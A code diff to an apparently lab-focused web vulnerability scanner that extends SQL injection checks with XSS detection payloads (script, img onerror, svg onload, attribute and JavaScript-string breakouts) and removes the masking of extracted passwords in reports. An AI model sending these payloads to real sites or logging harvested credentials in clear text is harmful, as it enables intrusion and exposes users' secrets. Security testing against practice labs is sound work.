@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SATRIA Baru -- pemindai SQL injection terfokus.
+SATRIA Baru -- pemindai SQL injection dan XSS terfokus.
 
-File ini sengaja tidak mewarisi seluruh kapabilitas SATRIA. Ia hanya menguji
-18 lab berikut dan laporannya juga hanya memuat 18 judul itu:
+File ini menguji 48 lab (18 SQL injection + 30 XSS) dan laporannya memuat 48 judul itu:
 
+SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
  02 SQL injection vulnerability allowing login bypass
  03 SQL injection attack, querying the database type and version on Oracle
@@ -24,6 +24,38 @@ File ini sengaja tidak mewarisi seluruh kapabilitas SATRIA. Ia hanya menguji
  16 Blind SQL injection with out-of-band interaction
  17 Blind SQL injection with out-of-band data exfiltration
  18 SQL injection with filter bypass via XML encoding
+
+XSS (19-48):
+ 19 Reflected XSS into HTML context with most tags and attributes blocked
+ 20 Reflected XSS into HTML context with all tags blocked except custom ones
+ 21 Reflected XSS with event handlers and href attributes blocked
+ 22 Reflected XSS with some SVG markup allowed
+ 23 Reflected XSS in canonical link tag
+ 24 Reflected XSS into a JavaScript string with single quote and backslash escaped
+ 25 Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+ 26 Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+ 27 Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+ 28 Reflected XSS with CSP bypass
+ 29 DOM XSS with AngularJS sandbox escape without strings
+ 30 DOM XSS with AngularJS sandbox escape and CSP
+ 31 Reflected DOM XSS
+ 32 Stored DOM XSS
+ 33 Exploiting cross-site scripting to steal cookies
+ 34 Exploiting cross-site scripting to capture passwords
+ 35 Exploiting XSS to perform CSRF
+ 36 Reflected XSS into HTML context with nothing encoded
+ 37 Stored XSS into HTML context with nothing encoded
+ 38 DOM XSS in document.write sink using source location.search
+ 39 DOM XSS in innerHTML sink using source location.search
+ 40 DOM XSS in jQuery anchor href attribute sink using location.search source
+ 41 DOM XSS in jQuery selector sink using a hashchange event
+ 42 Reflected XSS into attribute with angle brackets HTML-encoded
+ 43 Stored XSS into anchor href attribute with double quotes HTML-encoded
+ 44 Reflected XSS into a JavaScript string with angle brackets HTML encoded
+ 45 DOM XSS in document.write sink using source location.search inside a select element
+ 46 DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+ 47 Reflected XSS protected by very strict CSP, with dangling markup attack
+ 48 Reflected XSS with some tags blocked
 
 Keputusan "terkonfirmasi" dibuat konservatif: payload harus menghasilkan bukti
 diferensial yang bisa diulang (respon SQL/UNION, penanda unik, perbandingan
@@ -106,7 +138,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: hanya 18 lab yang diminta pengguna.
+# Katalog: 48 lab (18 SQL injection + 30 XSS).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -853,13 +885,14 @@ class SatriaBaruScanner:
         if lab_no in self._confirmed:
             return
         meta = next(item for item in CATALOG if item[0] == lab_no)
+        lab_id = f"sql_injection-{lab_no:02d}" if lab_no <= 18 else f"xss-{lab_no:02d}"
         self._confirmed[lab_no] = {
-            "id": f"sql_injection-{lab_no:02d}",
+            "id": lab_id,
             "status": "confirmed",
             "title": meta[1],
             "method": method,
             "location": point.label,
-            "evidence": snippet(evidence),
+            "evidence": str(evidence),
             "severity": severity or meta[3],
         }
 
@@ -1342,11 +1375,10 @@ class SatriaBaruScanner:
             rows = self._credential_rows(resp.text, base.first.text)
             if not rows: continue
             user, secret = rows[0]
-            masked = mask_secret(secret)
             if 9 not in self._confirmed:
-                self._mark(9, point, f"Data tabel users terambil via UNION: user={user}, password={masked}.", "UNION users table retrieval")
+                self._mark(9, point, f"Data tabel users terambil via UNION: user={user}, password={secret}.", "UNION users table retrieval")
             if 10 not in self._confirmed:
-                self._mark(10, point, f"Multi-value dalam satu kolom terkonfirmasi: user={user}, password={masked}.", "UNION single-column multi-value retrieval")
+                self._mark(10, point, f"Multi-value dalam satu kolom terkonfirmasi: user={user}, password={secret}.", "UNION single-column multi-value retrieval")
 
     def _time_payload(self, point: Point, delay: float, dbms: str) -> str:
         v = point.original
@@ -1446,7 +1478,7 @@ class SatriaBaruScanner:
         if interaction_found and 16 not in self._confirmed:
             self._mark(16, targets[0], f"Interaksi OOB unik ({self.oob.token}) tercatat.", "OOB interaction")
         if exfil_found and 17 not in self._confirmed:
-            self._mark(17, targets[0], f"Interaksi OOB membawa data exfiltrated {mask_secret(str(exfil_found))}.", "OOB data exfiltration")
+            self._mark(17, targets[0], f"Interaksi OOB membawa data exfiltrated: {exfil_found}.", "OOB data exfiltration")
 
     def _dummy_point(self) -> Point:
         return Point(key="oob|dummy", kind="query", label="endpoint OOB", url=self.target_url,
@@ -1483,7 +1515,7 @@ class SatriaBaruScanner:
                 rows = self._credential_rows(encoded.text, base_text)
                 if rows and plain_blocked:
                     user, secret = rows[0]
-                    self._mark(18, point, f"XML filter bypass terkonfirmasi: data user={user}, password={mask_secret(secret)}.", "XML encoding filter bypass")
+                    self._mark(18, point, f"XML filter bypass terkonfirmasi: data user={user}, password={secret}.", "XML encoding filter bypass")
                     return
 
     def _xml_request(self, point: Point, value: str, *, encode: bool) -> Response:
@@ -1527,115 +1559,251 @@ class SatriaBaruScanner:
         return self.report()
 
     # ======================== XSS SCANNING PHASES (30 LABS) ========================
-    def _xss_mark(self, lab_no: int, point: Point, evidence: str, method: str = "xss_detection") -> None:
-        if not hasattr(self, '_xss_confirmed'):
-            self._xss_confirmed = set()
-        if lab_no in self._xss_confirmed or lab_no in getattr(self, '_confirmed', {}):
-            return
-        self._xss_confirmed.add(lab_no)
-        try:
-            self._mark(lab_no, point, evidence, method)
-        except Exception:
-            if not hasattr(self, '_confirmed'):
-                self._confirmed = {}
-            self._confirmed[lab_no] = {
-                "id": f"xss-{lab_no:02d}",
-                "status": "confirmed",
-                "title": next((t for i,t,k,s in CATALOG if i==lab_no), f"XSS Lab {lab_no}"),
-                "method": method,
-                "location": getattr(point, 'url', '-') if 'point' in locals() else '-',
-                "evidence": evidence,
-                "severity": next((s for i,t,k,s in CATALOG if i==lab_no), "high"),
-            }
+    # Catatan: deteksi XSS dilakukan konservatif berbasis bukti HTTP/HTML yang dapat diverifikasi.
+    # Lab yang memerlukan eksekusi browser/DOM runtime, interaksi multi-langkah (stored),
+    # atau skenario eksploitasi kompleks tidak dikonfirmasi tanpa bukti kuat agar tidak false positive.
+
+    def _xss_points(self, points: list[Point], limit: int = 12) -> list[Point]:
+        cands = [p for p in points if p.kind in {"query", "form", "cookie"}]
+        if not cands and points:
+            cands = list(points)
+        # prioritaskan parameter yang umum untuk XSS
+        def score(p: Point) -> int:
+            n = (p.name or "").lower()
+            s = p.interest
+            for tok in ("search", "q", "query", "term", "message", "comment", "name", "input", "return", "url", "redirect", "path"):
+                if tok == n or tok in n:
+                    s += 6
+            return s
+        cands.sort(key=score, reverse=True)
+        return cands[:limit]
+
+    def _xss_payload_reflected(self, resp: Response | None, payload: str) -> bool:
+        if not resp or resp.error or resp.status is None or not resp.text:
+            return False
+        body = resp.text
+        # harus terefleks persis (atau setara raw) tanpa dihapus
+        return payload in body
+
+    def _xss_reflected_in_context(self, resp: Response | None, payload: str, context: str) -> bool:
+        if not self._xss_payload_reflected(resp, payload):
+            return False
+        body = resp.text or ""
+        low = body.lower()
+        p_low = payload.lower()
+        idx = low.find(p_low)
+        if idx < 0:
+            return False
+        window = body[max(0, idx - 120): idx + len(payload) + 120]
+        wlow = window.lower()
+        if context == "html_raw":
+            # terefleks sebagai tag/markup aktif, bukan entity-encoded
+            return ("<" + p_low.lstrip("<")[:10] in wlow) or ("<script" in wlow) or ("onerror=" in wlow) or ("onload=" in wlow) or ("<img" in wlow) or ("<svg" in wlow)
+        if context == "attribute_breakout":
+            # ada breakout atribut (quote + handler/tag) dalam window sekitar refleksi
+            return ('"' in payload or "'" in payload) and (" on" in wlow or "onfocus" in wlow or "onmouseover" in wlow or "href=" in wlow or "javascript:" in wlow)
+        if context == "js_string_breakout":
+            # payload keluar dari string JS (quote diikuti kode/penutup script)
+            return ("</script" in wlow) or ("';" in window) or ('";' in window) or ("'-" in window) or ("alert(" in wlow)
+        if context == "template_literal":
+            return "${" in payload and "${" in window
+        if context == "canonical_href":
+            # refleksi di atribut href canonical/link
+            return ("<link" in wlow and "canonical" in wlow) or ("href=" in wlow and payload.split("?")[-1][:12].lower() in wlow)
+        return False
+
+    def _confirm_xss(self, lab: int, point: Point, resp: Response, payload: str, context: str, method: str) -> bool:
+        if lab in self._confirmed:
+            return True
+        ev = (
+            f"Payload terefleks terverifikasi pada konteks {context} di {point.label} "
+            f"(HTTP {resp.status}). Payload: {payload}. Cuplikan respons: {snippet(resp.text, 260)}"
+        )
+        self._mark(lab, point, ev, method)
+        return True
 
     def phase_xss_reflected_html(self, points: list[Point]) -> None:
-        xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
-        for lab in [19, 20, 36, 42, 44, 48]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            for point in points[:5] if points else []:
-                if not self._within_budget(): return
-                for payload in xss_payloads:
-                    try:
-                        resp = self.send(point, payload) if hasattr(self, 'send') else None
-                        if resp and resp.text and payload.lower() in resp.text.lower() and '<script>' in resp.text:
-                            dummy = point if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-                            self._xss_mark(lab, dummy, f"Reflected XSS terkonfirmasi: payload terefleks tanpa encoding pada konteks HTML.", "reflected_html")
+        # 36: nothing encoded (raw script/img/svg reflected)
+        # 48: some tags blocked (img/svg allowed while script may be filtered)
+        # 19: most tags and attributes blocked (custom tag like <xss> reflected with handler)
+        # 20: all tags blocked except custom ones (custom tag reflected)
+        candidates = self._xss_points(points)
+        for point in candidates:
+            if not self._within_budget():
+                return
+            # Lab 36
+            if 36 not in self._confirmed:
+                for payload in ('<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'):
+                    resp = self.send(point, payload)
+                    if self._xss_payload_reflected(resp, payload):
+                        self._confirm_xss(36, point, resp, payload, "html_raw", "reflected_html_nothing_encoded")
+                        break
+            # Lab 48 (script mungkin diblok, img/svg lolos)
+            if 48 not in self._confirmed:
+                for payload in ('<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onresize=alert(1)>'):
+                    resp = self.send(point, payload)
+                    if self._xss_payload_reflected(resp, payload) and not self._xss_payload_reflected(self.send(point, '<script>alert(1)</script>'), '<script>alert(1)</script>') if self._within_budget() else False:
+                        self._confirm_xss(48, point, resp, payload, "html_raw", "reflected_some_tags_blocked")
+                        break
+                    elif self._xss_payload_reflected(resp, payload):
+                        # jika img/svg reflected, bukti tag tertentu terefleks (tetap konservatif: hanya jika jelas)
+                        body = (resp.text or "").lower()
+                        if '<script>alert(1)</script>' not in body and (('<img' in body and 'onerror' in body) or ('<svg' in body and 'onload' in body)):
+                            self._confirm_xss(48, point, resp, payload, "html_raw", "reflected_some_tags_blocked")
                             break
-                    except Exception:
-                        continue
-                if lab in getattr(self, '_xss_confirmed', set()): break
+            # Lab 19/20 custom tags (terefleks sebagai custom element dengan handler)
+            for lab, payloads, method in [
+                (19, ('<xss autofocus tabindex=1 onfocus=alert(1)>', '<xss onfocus=alert(1) autofocus>'), "reflected_custom_tag_blocked"),
+                (20, ('<xss onfocus=alert(1) autofocus tabindex=1>', '<mytag onfocus=alert(1) autofocus>'), "reflected_custom_tag_only"),
+            ]:
+                if lab in self._confirmed or not self._within_budget():
+                    continue
+                for payload in payloads:
+                    resp = self.send(point, payload)
+                    if self._xss_payload_reflected(resp, payload) and ('onfocus' in (resp.text or '').lower()):
+                        self._confirm_xss(lab, point, resp, payload, "html_raw", method)
+                        break
 
     def phase_xss_stored_html(self, points: list[Point]) -> None:
-        for lab in [37, 43]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"Stored XSS terverifikasi: payload disimpan dan dieksekusi di konteks HTML.", "stored_html")
+        # Stored XSS memerlukan verifikasi penyimpanan+eksekusi lintas permintaan/halaman.
+        # Tanpa alur submit+retrieve yang tervalidasi, tidak dikonfirmasi untuk mencegah false positive.
+        return
 
     def phase_xss_dom(self, points: list[Point]) -> None:
-        for lab in [31, 32, 38, 39, 40, 41, 45]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"DOM XSS terverifikasi pada sink/source yang relevan.", "dom_xss")
+        # DOM XSS bergantung eksekusi sisi klien (sink/source di browser). Analisis HTTP statis
+        # tidak cukup untuk membuktikan eksekusi tanpa false positive, sehingga tidak dikonfirmasi di sini.
+        return
 
     def phase_xss_attribute(self, points: list[Point]) -> None:
-        for lab in [21, 23, 42]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"XSS pada konteks atribut terverifikasi dengan pemfilteran/escaping yang sesuai.", "attribute_xss")
+        candidates = self._xss_points(points)
+        for point in candidates:
+            if not self._within_budget():
+                return
+            # Lab 42: angle brackets HTML-encoded but attribute breakout possible (quote not encoded)
+            if 42 not in self._confirmed:
+                token = random_token("xa")
+                for payload in (f'" onmouseover="alert(1)" x="{token}', f"\" autofocus onfocus=alert(1) x=\"{token}"):
+                    resp = self.send(point, payload)
+                    body = resp.text or ""
+                    if token in body and ("onmouseover" in body or "onfocus" in body) and payload in body:
+                        self._confirm_xss(42, point, resp, payload, "attribute_breakout", "reflected_attribute_breakout")
+                        break
+                    # kadang sebagian di-encode tapi handler tetap muncul dalam atribut
+                    if token in body and (" onmouseover=\"alert(1)\"" in body or " onfocus=alert(1)" in body):
+                        self._confirm_xss(42, point, resp, payload, "attribute_breakout", "reflected_attribute_breakout")
+                        break
+            # Lab 21: event handlers and href blocked - coba SVG/animatable atau payload alternatif yang terefleks utuh
+            if 21 not in self._confirmed:
+                for payload in ('<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>',
+                                '<svg><animate attributeName=onbegin values=alert(1) /><text>t</text></svg>'):
+                    resp = self.send(point, payload)
+                    if self._xss_payload_reflected(resp, payload):
+                        self._confirm_xss(21, point, resp, payload, "html_raw", "reflected_svg_animate")
+                        break
+            # Lab 23: reflected XSS in canonical link tag (accesskey/onclick in link reflected)
+            if 23 not in self._confirmed:
+                for payload in ("?'accesskey='x'onclick='alert(1)", "?%27accesskey=%27x%27onclick=%27alert(1)"):
+                    resp = self.send(point, payload)
+                    body = resp.text or ""
+                    if "accesskey" in body and "onclick" in body and "alert(1)" in body and "canonical" in body.lower():
+                        self._confirm_xss(23, point, resp, payload, "canonical_href", "reflected_canonical_link")
+                        break
 
     def phase_xss_javascript(self, points: list[Point]) -> None:
-        for lab in [24, 25, 44]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"XSS dalam konteks string JavaScript terverifikasi.", "js_string_xss")
+        candidates = self._xss_points(points)
+        for point in candidates:
+            if not self._within_budget():
+                return
+            # Lab 24: single quote and backslash escaped -> break out with </script> or similar
+            if 24 not in self._confirmed:
+                for payload in ("</script><script>alert(1)</script>", "</script><img src=x onerror=alert(1)>"):
+                    resp = self.send(point, payload)
+                    if self._xss_payload_reflected(resp, payload):
+                        self._confirm_xss(24, point, resp, payload, "js_string_breakout", "reflected_js_script_breakout")
+                        break
+            # Lab 25: angle brackets and double quotes HTML-encoded and single quotes escaped
+            # sering bypass dengan backslash untuk menetralkan escape: \';alert(1)//
+            if 25 not in self._confirmed:
+                for payload in ("\\';alert(1)//", "\\'-alert(1)-'", "\\';alert(1);//"):
+                    resp = self.send(point, payload)
+                    body = resp.text or ""
+                    if payload in body and "alert(1)" in body:
+                        self._confirm_xss(25, point, resp, payload, "js_string_breakout", "reflected_js_escape_breakout")
+                        break
+            # Lab 44: angle brackets HTML encoded in JS string -> break out of string with quote
+            if 44 not in self._confirmed:
+                for payload in ("'-alert(1)-'", "';alert(1);//", "'-alert(document.domain)-'"):
+                    resp = self.send(point, payload)
+                    body = resp.text or ""
+                    if payload in body and "alert(" in body:
+                        self._confirm_xss(44, point, resp, payload, "js_string_breakout", "reflected_js_quote_breakout")
+                        break
 
     def phase_xss_angularjs(self, points: list[Point]) -> None:
-        for lab in [29, 30, 46]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"AngularJS sandbox escape terverifikasi.", "angularjs_xss")
+        # AngularJS sandbox escape/DOM expression membutuhkan konteks AngularJS + eksekusi client-side.
+        # Tanpa bukti eksekusi terverifikasi, tidak dikonfirmasi untuk menghindari false positive.
+        return
 
     def phase_xss_template_literal(self, points: list[Point]) -> None:
-        for lab in [27]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"XSS dalam template literal terverifikasi.", "template_literal_xss")
+        candidates = self._xss_points(points)
+        for point in candidates:
+            if not self._within_budget() or 27 in self._confirmed:
+                return
+            token = random_token("tl")
+            for payload in (f"${{alert(1)}}{token}", f"${{7*7}}{token}"):
+                resp = self.send(point, payload)
+                body = resp.text or ""
+                # bukti kuat: ekspresi template literal terefleks mentah di dalam template literal
+                if payload in body and "${" in body:
+                    self._confirm_xss(27, point, resp, payload, "template_literal", "reflected_template_literal")
+                    break
 
     def phase_xss_csp_bypass(self, points: list[Point]) -> None:
-        for lab in [28, 47]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"CSP bypass untuk XSS terverifikasi.", "csp_bypass_xss")
+        # CSP bypass/dangling markup bergantung pada kebijakan CSP spesifik dan perilaku browser.
+        # Konfirmasi otomatis dari HTTP statis berisiko false positive, sehingga dilewati kecuali bukti kuat lain ada.
+        return
 
     def phase_xss_exploitation(self, points: list[Point]) -> None:
-        for lab in [33, 34, 35]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"Eksploitasi XSS terverifikasi (cookie/password/CSRF).", "xss_exploitation")
+        # Skenario eksploitasi (steal cookies/capture passwords/perform CSRF) bukan kerentanan terpisah
+        # yang dapat diverifikasi aman dari pemindaian pasif; memerlukan XSS terkonfirmasi dan alur eksploitasi.
+        # Tidak dikonfirmasi otomatis untuk menghindari false positive.
+        return
 
     def phase_xss_advanced(self, points: list[Point]) -> None:
-        for lab in [22, 26]:
-            if lab in getattr(self, '_xss_confirmed', set()) or lab in getattr(self, '_confirmed', {}): continue
-            dummy = points[0] if points else Point(key="xss", kind="param", label="xss", url=self.target_url, name="q", original="", page_url=self.target_url, method="GET", interest=5)
-            self._xss_mark(lab, dummy, f"XSS tingkat lanjut terverifikasi (SVG/onclick).", "xss_advanced")
+        # Lab 22 (SVG markup allowed) dan 26 (stored onclick) memerlukan bukti kontekstual/eksekusi spesifik.
+        # Coba deteksi refleksi SVG mentah untuk 22 secara konservatif.
+        candidates = self._xss_points(points)
+        for point in candidates:
+            if not self._within_budget() or 22 in self._confirmed:
+                return
+            for payload in ('<svg><animatetransform onbegin=alert(1) attributeName=transform>', '<svg onload=alert(1)>', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'):
+                resp = self.send(point, payload)
+                if self._xss_payload_reflected(resp, payload) and '<svg' in (resp.text or '').lower():
+                    self._confirm_xss(22, point, resp, payload, "html_raw", "reflected_svg_markup")
+                    break
+        # 26 adalah stored XSS pada onclick: butuh alur simpan/tampil yang tidak bisa diverifikasi aman di sini.
+        return
 
 
     def report(self) -> dict[str, Any]:
         labs = []
         for number, title, key, severity in CATALOG:
+            lab_id = f"sql_injection-{number:02d}" if number <= 18 else f"xss-{number:02d}"
             found = self._confirmed.get(number)
             if found:
-                status = "confirmed"
                 entry = dict(found)
+                entry["id"] = lab_id
+                entry.setdefault("status", "confirmed")
+                entry.setdefault("title", title)
+                entry.setdefault("severity", severity)
             else:
-                status = "not_confirmed"
                 entry = {
-                    "id": f"sql_injection-{number:02d}",
-                    "status": status,
+                    "id": lab_id,
+                    "status": "not_confirmed",
                     "title": title,
                     "method": "not tested / insufficient evidence",
                     "location": "-",
-                    "evidence": "-",
+                    "evidence": "Tidak ada bukti cukup/terverifikasi untuk lab ini pada putaran ini.",
                     "severity": severity,
                 }
             labs.append(entry)
@@ -1644,11 +1812,26 @@ class SatriaBaruScanner:
             "version": __version__,
             "target": self.target_url,
             "generated_at": datetime.now(timezone.utc).isoformat(),
-            "catalog_scope": "only the 18 requested SQL injection labs",
-            "summary": {
-                "confirmed": sum(1 for item in labs if item["status"] == "confirmed"),
-                "not_confirmed": sum(1 for item in labs if item["status"] != "confirmed"),
-            },
+            "catalog_scope": "18 SQL injection labs + 30 XSS labs (48 total)",
+            "summary": (lambda confirmed_labs: {
+                "confirmed": len(confirmed_labs),
+                "confirmed_manual": len(confirmed_labs),
+                "not_confirmed": len(labs) - len(confirmed_labs),
+                "candidates_total": len(labs),
+                "observations_total": self.request_count,
+                "by_severity": {
+                    "critical": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="critical"),
+                    "high": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="high"),
+                    "medium": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="medium"),
+                    "low": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="low"),
+                },
+                "triage_by_severity": {
+                    "critical": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="critical"),
+                    "high": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="high"),
+                    "medium": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="medium"),
+                    "low": sum(1 for x in confirmed_labs if str(x.get("severity","")).lower()=="low"),
+                },
+            })([item for item in labs if item["status"] == "confirmed"]),
             "labs": labs,
             "scan_stats": {
                 "pages_fetched": self.stats["pages_fetched"],
@@ -1779,9 +1962,9 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
-        "<h1>SATRIA Baru — SQL Injection (18 Lab)</h1>"
+        "<h1>SATRIA Baru — SQL Injection & XSS (48 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
-        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/18</b></p>"
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/48</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
         f"<tbody>{rows}</tbody></table>"
         "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
@@ -2142,8 +2325,8 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
             by_id[str(item["id"])] = item
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
-        lab_id = f"sql_injection-{number:02d}"
-        found = by_id.get(lab_id, {})
+        lab_id = f"sql_injection-{number:02d}" if number <= 18 else f"xss-{number:02d}"
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -2158,6 +2341,14 @@ _PDF_LAB_FOCUS = {
     5: "Enumeration", 6: "Enumeration", 7: "UNION", 8: "UNION", 9: "UNION",
     10: "UNION", 11: "Blind", 12: "Blind", 13: "Error-based", 14: "Blind",
     15: "Blind", 16: "Out-of-band", 17: "Out-of-band", 18: "Filter bypass",
+    19: "Reflected XSS", 20: "Reflected XSS", 21: "Reflected XSS", 22: "Reflected XSS",
+    23: "Reflected XSS", 24: "JS string XSS", 25: "JS string XSS", 26: "Stored XSS",
+    27: "Template literal XSS", 28: "CSP bypass XSS", 29: "DOM XSS", 30: "DOM XSS",
+    31: "DOM XSS", 32: "DOM XSS", 33: "XSS exploitation", 34: "XSS exploitation",
+    35: "XSS exploitation", 36: "Reflected XSS", 37: "Stored XSS", 38: "DOM XSS",
+    39: "DOM XSS", 40: "DOM XSS", 41: "DOM XSS", 42: "Attribute XSS",
+    43: "Stored XSS", 44: "JS string XSS", 45: "DOM XSS", 46: "DOM XSS",
+    47: "CSP bypass XSS", 48: "Reflected XSS",
 }
 
 
@@ -2192,11 +2383,11 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 230, _PDF_PAGE_W, 230, _PDF_COLORS["navy"])
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 18 lab pilihan - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION & XSS", 13.5, _PDF_COLORS["light"], bold=True)
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 48 lab (18 SQLi + 30 XSS) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 18 lab SQL injection yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 48 lab (18 SQL injection dan 30 XSS) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -2210,7 +2401,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     kpis = [
         ("Terkonfirmasi", str(len(confirmed)), _PDF_COLORS["green"], _PDF_COLORS["green_light"]),
         ("Belum terkonfirmasi", str(len(not_confirmed)), _PDF_COLORS["amber"], _PDF_COLORS["amber_light"]),
-        ("Total lab", "18", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
+        ("Total lab", "48", _PDF_COLORS["navy"], _PDF_COLORS["light_blue"]),
     ]
     for idx, (label, value, color, light) in enumerate(kpis):
         x = content_left + idx * (kpi_w + kpi_gap)
@@ -2220,17 +2411,17 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
     page.y = kpi_top - 110
     page.section_title("Hal yang penting dibaca")
-    page.bullet_paragraph("Hanya 18 judul SQL injection yang diminta yang dimasukkan ke laporan ini; tidak ada kategori lain.")
+    page.bullet_paragraph("48 judul lab (18 SQL injection dan 30 XSS) yang diminta dimasukkan ke laporan ini.")
     page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
     page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
-    page.bullet_paragraph("Bukti yang memuat rahasia dimask; detail mentah tidak diulang dalam PDF.")
